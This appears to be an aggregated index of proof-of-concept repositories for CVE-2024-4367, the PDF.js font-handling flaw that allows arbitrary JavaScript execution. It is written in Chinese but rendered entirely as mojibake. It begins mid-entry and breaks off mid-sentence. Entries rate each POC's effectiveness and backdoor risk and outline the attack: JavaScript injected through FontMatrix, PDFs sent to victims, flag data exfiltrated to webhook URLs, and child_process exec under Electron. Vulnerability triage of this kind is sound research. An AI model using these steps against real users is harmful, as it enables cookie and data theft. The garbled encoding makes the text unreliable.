**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

